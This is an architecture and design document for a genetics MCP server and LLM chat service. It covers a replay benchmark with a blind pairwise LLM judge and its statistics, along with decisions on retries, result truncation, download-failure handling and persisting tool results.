- **Every `ok` turn records its whole tool-call sequence** in `tool_calls_detail` — one
  entry per `tool_use` block of `message_content`, in emission order, with `tool_calls`
  defined as its length so the count and the listing cannot disagree. Arguments are kept
  **verbatim and untruncated**, `run_analysis`'s entire script included: a count says one
  arm made one call where the other made six and cannot say whether that call asked for the
  right thing. Tool *results* are deliberately not recorded — one call can return thousands
  of rows, and the question this answers is what the model **asked for**.

  Two fields come from the SSE stream's *ordering* rather than the `done` chunk, which
  flattens every iteration's blocks into one list with no boundary between them: `iteration`
  (the roundtrip a call belongs to — without it, six calls in one parallel iteration are
  indistinguishable from six iterations of one call each, which was ambiguous on 46 of 106
  turns of the 2026-08-19 run) and, for `run_analysis` only, `script_duration_ms` /
  `script_status` from its `script_result` chunk, correlated by `tool_use_id`. **No other
  tool is timed on the wire**: an iteration's calls are dispatched with `asyncio.gather`, so
  only the whole phase is measured. `attach_call_metadata` correlates on `id` alone and
  never takes arguments from the streamed copy — `llm_service` rewrites that copy before
  emitting it (substituting `search_scientific_literature`'s backend, stripping
  `run_analysis`'s model-invented `user`/`session_id`), so it is what the server ran rather
  than what the model asked for. Absent stays absent: against a server that emits no
  `tool_use` chunks the keys are simply missing, never imputed.

  `secret=true` does not redact any of this. `llm_service` omits tool input from its log
  line, not from the `done` chunk.
- **Output** is a JSON report (`--output`) carrying the config, the per-case arm
  order, the matched-pair headline summaries, the unmatched per-arm marginals and
  every individual turn record (including the per-iteration usage detail and the two
  fields above), plus a human-readable summary on stdout. When `--judge` ran, the
  report also carries a `judging` block and the summary prints its section.
- **A 429 aborts the run** rather than being recorded as one broken turn. It is not a turn
  failing, it is the server refusing everything from here on, and the turns already replayed
  keep their cost while every later turn of their cases cascades to `not_attempted` —
  measured against the default `RATE_LIMIT_PER_HOUR=20`, a 20-case run saved a report that
  still looked complete (20 cases, both arms, correct `arm_tools`) while carrying 8 of 53
  matched pairs. `RateLimitedError` is the one exception the "a broken turn must not abort
  the run" handler re-raises; `main()` exits 2 after computing the plan's request count and
  printing the `RATE_LIMIT_*` values that would cover it.

### Per-question scorecard

`scripts/benchmark_scorecard.py` reads a saved report and re-measures nothing, so it is free
to run and re-run. The default view is one row per case, both arms side by side, over wall
clock, USD, tool calls and the judge's pairwise verdict — the distributions answer "which arm
is cheaper", not "on which questions".

A case whose turns did not all succeed on **both** arms is marked and excluded from the
totals, with the reason printed: an arm that aborted early spent less of everything, and
summing it beside one that finished scores failure as efficiency. A report containing 429s
is called out above the table for the same reason. The judge column is a tally of pairwise
verdicts, never a score — `pairwise_judge` picks a winner or a tie per turn and produces no
per-arm scale to put in a column.

`--tools` prints each case's ordered call sequence with arguments. `--transcript` puts the
two arms in **two columns aligned turn by turn**, with the timing that explains each turn
above its calls: model time vs summed tool phases, the slowest iteration, script attempts and
failures by shape, and the retry loops a failed script bought. Both elide long arguments
visibly (`…`) and point at the `jq` that yields the whole value. `tool phases` sums the
per-iteration phases and is **not** the sum of per-call durations, which nothing measures; a
`+` marks a total some iteration's phase was missing from.

`--markdown FILE` writes the same conversations as a document instead of a terminal view
(`-` for stdout, `--case` to restrict it): per case and turn, the question, each arm's timing
line, every tool call with its arguments **whole**, and both final answers verbatim, followed
by the judge's verdict with the reasoning from both presentation orders. It also writes
**one file per arm** beside it — `FILE.<arm>.md`, the same cases and questions with only that
arm's calls and answers — because the paired document answers "why did this case go
differently" while a single arm's file is what is read alone or diffed against the same arm
from another run, where the other arm's calls are noise. A one-arm file still carries the
case's comparability line and the pairwise verdict naming the other arm: the property being
reported belongs to the **pair**, and a one-arm file that dropped it would present an arm
whose partner fell over as a clean run. `-` prints the paired document only, since a single
stream cannot be three files. The elision is what
the file exists to remove — the two column views are width-bound, and a `run_analysis` script
is precisely the argument that never fits, so an argument's fence grows past any backticks
inside it rather than the value being cut. Prose the answer-slicing rule
discarded is printed **where the model wrote it** — before the first call, or after the call
it followed — rather than appended, since "written after call 3" is most of what it means; a
report predating its capture says so instead, and names re-running as the fix. When the run
was made with `replay_benchmark --capture-thinking`, each iteration's summarized reasoning
appears in the
call list immediately **before** the calls it produced — collected at the top of a turn it
would answer nothing — and iterations that called no tool, the final answering one included,
show their reasoning after the calls. What a saved report cannot supply is stated in the
document itself rather than left to be discovered: **tool results are not recorded at all**,
and assistant prose written before a turn's last tool call was discarded at capture by
`final_answer_split` with only its length kept, so a turn that lost text says how much.
- Authentication, when the target requires it, comes from `$REPLAY_AUTH_TOKEN` and is
  sent as a bearer token; it is never written into the report or logged.

## Paired Quality Judging

`scripts/pairwise_judge.py` answers the half of `genetics-results-suite-4h6.23`'s kill
criterion the benchmark's own metrics cannot: "must not **regress** quality". It is
**off by default** (`--judge` on the benchmark, or
`python -m genetics_mcp_server.scripts.pairwise_judge --report <file>` over a report
already written) — a run produces cost and latency numbers with no judge call at all.

- **Paired, not absolute — and deliberately not the Conversation Analysis rubric.**
  `analyze_conversations` scores one conversation at a time on a 1–5 rubric; it was
  built for sampling and for tracking quality over time. Scoring each arm absolutely
  and comparing means is a weak test here: the rubric is coarse, the expected
  between-arm difference is small, and per-question difficulty dominates the score, so
  a real regression sits inside the noise at the `n` a local run produces. Judging the
  two answers to the *same* question side by side cancels that difficulty. The absolute
  rubric remains worth adding later — it is the only thing comparable with historical
  production numbers — but it answers a different question and is not blocking.
- **The input is the harness's own matched pairs.** `matched_pairs()` already keeps
  only the `(case_id, turn_index)` keys that came back `ok` on *both* arms; the judge
  calls it rather than re-deriving the set, so the pairing rule ("an arm is not
  rewarded for failing on the hard turns") has one definition.
- **Blind, and the arm cannot leak through the content.** The judge sees the user
  question, the earlier *user* turns of that case for context, and two answers labelled
  only "Answer 1" and "Answer 2". No arm name, tool profile, model or mechanism appears
  in the prompt, and only the **final answers** are shown — never the tool trace. That
  choice is the point rather than a simplification: a `run_analysis` call carrying
  Python identifies the code arm outright and a screenful of `get_*` calls identifies
  the all-tools arm, so blinding the judge while showing it the trace would be theatre.
  The cost is stated rather than hidden — the judge cannot see that one arm reached its
  answer through six roundtrips and the other through one — and it is accepted because
  efficiency is what the benchmark measures *exactly*, while the judge is asked only
  about the thing no metric can see. Prior *assistant* turns are withheld for the same
  reason: they differ per arm. Answers over 12,000 characters are elided in the
  **middle** (head and conclusion preserved) and the count is reported **per arm**, not
  as a pair count: the rule is applied identically to both arms but does not *fire*
  equally, and "6 pairs were elided" reads as symmetric information loss when it can
  mean one arm was judged on a third of what it wrote and the other on all of it.
- **The answer-slicing rule is not neutral between the arms, so its cost is measured.**
  The "final answer" is the text after the **last** `tool_use` block, which is right for
  intermediate commentary ("let me query BigQuery for that") and wrong for substantive
  content that happens to precede a late tool call — a turn that lays out a table, calls
  one more tool and closes with "In summary, yes." is judged on the closing sentence, and
  a turn whose last block *is* the `tool_use` is judged on nothing. An arm that makes one
  **early** call keeps nearly all its prose; an arm whose last call is **late** loses
  whatever it wrote between calls, and nothing in the win/loss table can distinguish that
  handicap from worse answers, because `answer_chars` and the whole length diagnostic are
  computed on the already-sliced text. So `final_answer_split` returns the number of
  characters it discarded, `replay_benchmark` records it per turn
  (`final_answer_dropped_chars`), and the report prints the **per-arm median** beside the
  length check. Materially different medians mean the verdict is partly measuring this
  rule rather than answer quality.
- **Judged both ways, and a disagreement is a tie.** Position bias in pairwise LLM
  judging is large, so every pair is judged twice with the answers swapped. A pair is a
  win only when **both** orders name the same answer; both-tie, one-tie-one-winner and
  the two orders naming *different* answers are all ties, reported separately
  (`tie_agreed` / `tie_unstable` / `tie_position_flip`) so an unstable verdict is
  visible rather than averaged away. `tie_position_flip` is the direct measurement of
  position bias in the run. This doubles judge cost and is the cheapest defence there
  is.
- **The presentation order is seeded from the pair, not drawn at random.** Which arm is
  shown first in pass 1 is `sha256("<case_id>|<turn_index>")` — not `hash()`, whose
  per-process salt would make the same report judge differently on every run, and not a
  global RNG, whose draw depends on how many pairs happened to precede this one. With
  both-ways judging the order cannot change a verdict, so this is not the primary
  defence; it is what makes a run reproducible, fixes which order is attempted first so
  a pair whose second pass fails is not resolved from an arbitrary position, and is
  recorded per pair.
- **Ties are first-class** in the prompt and in the report. Forcing a winner on two
  equally good answers manufactures signal.
- **The distribution is reported, never a bare win rate**: wins per arm with clear /
  slight / **none** margins (they sum to the win count — a win *can* carry `none`, since
  the weaker of the two passes' margins is quoted and an unrecognised strength word
  normalises to it; the words the judge actually used that were not recognised are
  listed rather than dropped), ties split by kind, unresolved pairs, and per-pair detail
  carrying both passes' verdicts and the judge's own one-line reason — because the
  criterion is about the **loss tail**, which is reported in **both directions** rather
  than assuming from the arm order which arm is the candidate, and only reads as a list.
  The rate is accompanied by an exact two-sided **sign test** over decisive pairs (ties
  excluded, not split), and below `MIN_DECISIVE_PAIRS` — 6, the smallest n at which a
  sign test can reach p ≤ 0.05 *at all* — the report prints
  `NOT CONCLUSIVE AT ANY OUTCOME`, **no p-value and no win rate**: "1 win = 100.0% of
  decisive" above a NOT CONCLUSIVE line is exactly the solid-looking number the rule
  exists to forbid. The same power rule travels with every **restricted** table into the
  saved JSON (each carries `underpowered` and the threshold), so the printed report and
  the JSON cannot disagree about whether a number is quotable.
- **Ties are a statement about the instrument, not only about the arms**, and the report
  says so where they are printed. Every tie counts toward passing "must not regress", but
  a large `tie_position_flip` count means position moved this judge more than the answers
  did — i.e. a regression of that size *could not have been detected*, which is not the
  same as there not being one.
- **A failed or unparseable judge call leaves the pair `unresolved`**, in neither the
  win nor the tie totals, and the second call is skipped when the first already failed.
  A pair judged once is a pair judged from one position.
- **The known confounds are measured, not assumed away.** Pairwise judges favour
  length, so the report states how often the longer answer won and each arm's median
  answer length — computed on the text **as shown to the judge**, after middle-elision,
  because 40,000 and 20,000 characters both arrive as 12,000 in the prompt and the one
  diagnostic whose job is to warn "your judge is rewarding length" must not report a
  difference elision had already removed. The raw medians are kept beside them, labelled
  as the lengths the judge did *not* see.
- **Provenance markers are detected, never scrubbed — and the audit states its own
  asymmetry where the numbers are.** Text in which an answer names its own machinery
  ("I ran a script", "the sandbox", a Python fence, and the iteration-cap notice
  `[Max tool iterations reached]`, which survives the slicing rule verbatim and is a
  near-perfect tell for the many-roundtrip arm) is detected per answer, counted **per
  arm** — a pooled `sandbox=7` cannot say whether all seven were the same arm's, and
  one-sidedness is the entire question — and the whole win/loss/tie table is printed a
  second time over the pairs where **neither** answer carried any. Such text is
  deliberately **not** scrubbed: rewriting an answer changes what is being judged, and a
  regex editing model prose will eventually delete something load-bearing. The printed
  block states that the marker list **is asymmetric and cannot be otherwise** — most
  markers are tells for the arm that writes code, and no phrase reliably marks an answer
  assembled from many small tool calls — so the restricted subset drops one arm's pairs
  preferentially and a gap between the two tables is evidence about the **judge**, not
  about the arms. (The `artifact` pattern is deliberately narrow: in genetics prose
  "artifact" means a spurious signal far more often than a sandbox file, and a bare
  `\bartifacts?\b` fires on both arms, shrinking the clean control subset for a reason
  that has nothing to do with guessing an arm.)
- **A pair the harness broke is not a pair an arm lost.** An answer that could not be
  extracted is shown to the judge as empty and reads as a loss, which is right for a turn
  that answered nothing and wrong for an extraction failure — and eight one-sided empty
  answers are enough to manufacture a clean sweep with a significant p-value. So pairs
  carrying an empty answer get the same treatment provenance gets rather than a footnote:
  the whole table again over the pairs where **both** arms produced text, with the same
  power rule. Empty answers are further split by whether the turn *had* produced text
  before its last tool call, which separates a silent model (a quality finding) from the
  slicing rule having thrown the answer away (a bug). Judging is refused outright when
  **every** matched pair is missing at least one arm's answer — not only when both are
  missing, since the half-missing case is the catastrophic one.
- **Cost is its own line item, priced before it spends.** Judging is Opus-5 spend on
  top of the benchmark's (~$2.01/turn × 2 arms), doubled by the second pass. The
  estimate is printed **before the first call** — exactly, from the prompts that will
  actually be sent, with output priced at the `max_tokens` ceiling so the USD figure is
  an upper bound; `--dry-run --judge` prints a *nominal* estimate over the turn count
  since no answer exists yet. A judge model `cost.has_pricing()` cannot match reports
  `NOT PRICED` rather than a guess. After the run the actual spend is priced from the
  API's own usage counts and printed in the footer as a **separate** figure that is
  never folded into any arm's `cost_usd`: the arms' USD is what the answers cost, the
  judge's is what grading them cost.
- **The benchmark stays write-free.** `secret: true` is unchanged and the judge reads
  the harness's in-memory (or saved) transcripts, so no replayed turn is written into
  any chat history. `analyze_conversations` is not run in this environment, but the
  reason survives: the moment this points at a deployment whose history *is* sampled
  into the next `eval_dataset.json`, replayed turns would corrupt the sample.

## Development Workflow

- **Issue tracking**: beads (`bd`) tracks epics and tasks in `.beads/`, synced with git
- **Feature planning**: new features go through architecture exploration (`.claude/agents/architecture-explorer.md`) which proposes 3 alternatives, then the selected approach is broken into ultrafocused subtasks in beads
- **Task execution**: work through subtasks via `bd ready`, updating status as you go

## Documentation

- `README.md`: Installation, quick start, tool reference
- `.env.example`: All configuration variables
- This document: Architecture and implementation details

## Architecture decisions

1. **Shared tool definitions**: Single source of truth in `definitions.py` prevents drift between MCP and LLM service
2. **Async throughout**: All I/O uses async/await for concurrent tool execution
3. **Graceful degradation**: External service failures don't crash the server; fallbacks are used where available
4. **Streaming responses**: Chat API streams tokens via SSE for responsive UX. Multiple event types (`content`, `thinking`, `usage`, `script_result`, `image`, `error`, `done`) provide real-time feedback. Context usage tracking via `usage` events enables the frontend to show a live progress bar of context window consumption (see SSE event types section).
5. **Agentic loop**: LLM service supports multi-turn tool use with configurable iteration limit
6. **Retry on transient errors**: Anthropic API calls are retried up to 3 times with exponential backoff (1s, 2s, 4s) for transient errors. Retryability is detected two ways because of a streaming quirk: connection errors and `APIStatusError` with HTTP status 500/502/503/529, **and** by the error type carried in the body (`overloaded_error`, `api_error`, `internal_server_error`). The latter is essential — errors that arrive mid-stream (after the SSE connection returns HTTP 200) surface as a base `APIStatusError` with `status_code=200`, so status-code matching alone misses them (`anthropic_error_type()` in `llm_service.py` reads the real type from the body). If text was already streamed before the error, the user is notified with a "[Connection interrupted, retrying...]" message. When retries are exhausted, `_classify_error` (in `chat_api.py`) maps the error to a user-facing message keyed on the same body type: overload → "Claude is temporarily overloaded… please wait a moment and resend"; internal/upstream → "Claude had a temporary upstream error." Non-retryable errors (auth, bad request, rate limit) propagate immediately.
7. **Result truncation**: Large responses are truncated with warnings to prevent context overflow. The cap is `settings.mcp_max_result_size` (50,000 chars) applied to the serialized tool result in `llm_service.py`. The notice is built by `_truncation_notice()`, which states that what survives is an ordered PREFIX rather than a sample, that entire categories may be invisible, and that the result must not be used to count, to enumerate, or to conclude absence — pointing instead at narrower arguments, `summarize=true`, or the download link. Its item count comes from `_count_result_items()`, which understands every shape the data tools return (`results`, `rows`/`total_rows`, and `n_cs`/`cs`); counting only `results` previously dropped the count for exactly the credible-set summaries, degrading the notice to a bare "response too large". The system prompt carries the matching rule (`config/defaults.py`, under Tool Usage Guidelines). Truncation is positional, so it interacts badly with server-side row ordering: an unfiltered `get_credible_sets_by_qtl_gene` for a well-studied gene returns thousands of rows sorted by chromosome/position, and the tail — which may be the only rows of the requested data type — is cut before the model sees it. This produced a real wrong answer ("no caQTL rows at all" for IL7R, which in fact has 3,058). The fix is to filter server-side: the `data_types` parameter on `get_credible_sets_by_gene` / `_by_variant` / `_by_qtl_gene` is now a real API query parameter (previously it was sent and silently ignored by the results-api, which is also why the truncation was reached), and the results-api rejects undeclared query parameters with 422 so this class of drift cannot recur silently. `get_credible_sets_by_qtl_gene` also now defaults `summarize=True`, matching its sibling credible-set tools; it was the only one defaulting to variant-level rows, which is how a routine gene query reached 1.57 M chars. The summary is credible set-level, sorted by `mlog10p` and grouped by `data_type`, so what truncation drops is the weakest-signal tail rather than an entire chromosome's worth of rows. **A credible set is keyed by `(resource, dataset, trait, cell_type, cs_id)`, never by `cs_id` alone** — `cs_id` is unique only within one dataset's fine-mapping run of one trait in one cell type. caQTL `cs_id`s are derived from the chromatin peak and recur in every cell type the peak was tested in; eQTL Catalogue `cs_id`s like `ENSG00000187608_L1` recur across QTD studies. `_summarize_credible_sets_simple` grouped on `cs_id` alone, merging those into one row each: for IL7R caQTL it reported 46 credible sets across 9 cell types where the data holds 129 across 13, and PCSK9 caQTL came out at 78 instead of 359. Both aggregations now run in a single `group_by` on the full key — joining them would have to match on `cell_type`, which is null for GWAS, where `null != null` silently drops rows. `_summarize_credible_sets_trait` (used only by `get_credible_sets_by_phenotype`, a single resource and phenotype per call) is unaffected, since `cs_id` genuinely is unique in that scope. The summary also carries a `counts` block (`_summary_counts`) of per-data-type distinct totals — credible sets, associations (variant-level rows, matching an equivalent BigQuery `COUNT(*)`), variants, traits, cell types, datasets, plus `n_peaks` from `trait_original` for caQTL, whose molecular trait is a chromatin peak. It is emitted before `cs` in the dict so it survives truncation: at ~500 bytes for all data types it always fits, which means "how many peaks / cell types / associations" is answerable even on a result 28x over the cap, instead of the model counting whatever credible sets happened to fit
8. **Downloadable results**: Tools returning tabular data include `INCLUDE_IN_RESPONSE` download links. Direct API URLs are used for genetics API tools that support TSV format; other tools (BigQuery, LD, summary stats) have their results converted to TSV and stored on disk, served via `/chat/v1/downloads/{id}`. The `_download_url` and `_download_data` hints in tool results are processed by `_process_download_hints()` in `llm_service.py` before being sent to the LLM. All download links use relative URLs (e.g., `/api/v1/...` or `/chat/v1/downloads/...`) so they work correctly regardless of deployment domain. `INCLUDE_IN_RESPONSE` is placed at the front of the result dict so it survives JSON truncation for large results. For BigQuery, trailing SQL `LIMIT` clauses are stripped and `max_rows` is set to 100,000 so the download contains the full result set even when the LLM only displays a subset. The BigQuery proxy (`genetics-results-db`) enforces `MAX_ROWS=100000` as a hard cap. **A download failure is never silent.** `_process_download_hints` used to catch bare `Exception`, log a warning and return the result with `_download_data` already popped, which produced no link, no error to the user and no error to the model — indistinguishable from a result that never warranted a download, so nobody reported it. That hid the identical positional-rows defect twice (`bef`, then `buc` months later). Two things now hold: (1) `_convert_to_tsv` validates both shapes up front — including `filename`, which is `json.dump`ed into the sidecar *after* the `.tsv` is written, so a non-`str` would raise past the allow-list and orphan the data file — and raises `DownloadShapeError` (a `TypeError` subclass) naming the expected and the observed shape; (2) three failure modes are caught, each with its own ERROR log token and its own user-visible `INCLUDE_IN_RESPONSE` note, and **none of them is fatal to the chat turn**. A `DownloadShapeError` is logged as `DOWNLOAD_SHAPE_DEFECT tool=<name> shape=<observed>` with `exc_info=True` and surfaced as `DOWNLOAD_SHAPE_NOTE` (unexpected structure, results unaffected, logged for investigation, explicitly *not* worth re-running). A shape defect is not necessarily a local programming error: only the six BigQuery-backed tools and the UniProt helper build the payload locally, while most of the ~25 producers put the sibling results-api's parsed response body straight into `_download_data` unvalidated (`executor.py` `_get_ld_matrix`, `_get_summary_stats`, …), so a bad shape is as likely to be **upstream drift** — a class of failure this repo has already seen — and coupling chat-turn success to another repo's response shape would trade a missing link for a lost answer. `OSError` (everything the store can fail with — `ENOSPC`, permissions, a storage path that is not a directory) and `UnicodeEncodeError` (upstream JSON can decode lone surrogates that utf-8 cannot encode) keep the `DOWNLOAD_FAILED tool=<name> shape=<observed> error=<type>` token and `DOWNLOAD_FAILED_NOTE`, which now states the effect without asserting a cause (re-running helps for `ENOSPC` but never for an unencodable value). The distinct tokens matter operationally: `genetics-results-suite`'s `scripts/monitor/alerter.py` queries severity ≥ WARNING and pushes new alerts to Slack, so a disk problem and a producer/upstream defect are separable there. Both call sites (`_stream_anthropic`, `subagent._execute_subagent_tool`) pass `tool_name` so the log identifies the producer among the ~25 that emit `_download_data`. A recognized-but-empty payload (`{"results": []}`) still yields no link and no note — there is genuinely nothing to download.
9. **Tool result persistence (resumed conversations carry the data substrate)**: The chat API is stateless per request — the frontend replays the full conversation each turn. Tool `tool_result` blocks are persisted (`chat_messages.tool_results_json`, added via the standard PRAGMA/ALTER migration) so a resumed conversation replays the actual tool outputs the model saw, not just its prose summary. `_stream_anthropic` collects `all_tool_results` across agentic-loop iterations and emits them in the `done` SSE event; the frontend stores them and, on resume, rebuilds the `assistant(tool_use) → user(tool_result)` pairing (its history builder splits each persisted assistant turn into the assistant message plus a synthetic user message of `tool_result` blocks). The already-truncated, image-base64-stripped result content is stored as-is. **Backward compatible**: conversations saved before this feature have `tool_results_json = NULL`; on resume they emit only the assistant message and `_sanitize_tool_blocks` (in `llm_service.py`) strips the now-orphaned `tool_use` blocks — exactly the prior behavior. **Marker-strip safeguard**: the `*[Using tool: …]*` annotations injected during streaming are display-only, but they are persisted into the assistant text. Before history reaches the model, `_strip_tool_use_markers` (in `llm_service.py`, run just before `_sanitize_tool_blocks`) removes them from replayed assistant content (both string and text-block forms). Without this, a long/repetitive conversation could teach the model to imitate the notation — writing `*[Using tool: X]*` as prose instead of emitting a real `tool_use` block, then fabricating the result (observed in a real session whose tool-less turns predated the persistence fix). Real `tool_use` blocks are left untouched. To offset the larger replayed payload, `_mark_history_cache_breakpoint` adds a `cache_control: ephemeral` breakpoint on the last replayed message (the 3rd of Anthropic's 4 breakpoints, alongside the system prompt and tool definitions). System-prompt guardrails (`config/defaults.py`) additionally instruct the model to treat credible-set membership as distinct from LD and to re-query authoritative tools for count/membership/lead questions rather than relying on earlier summaries.

## Future considerations

1. Add caching for genetics API responses
2. Support additional LLM providers (Google, local models)
3. Implement tool-level access control
4. Add WebSocket transport for bidirectional streaming
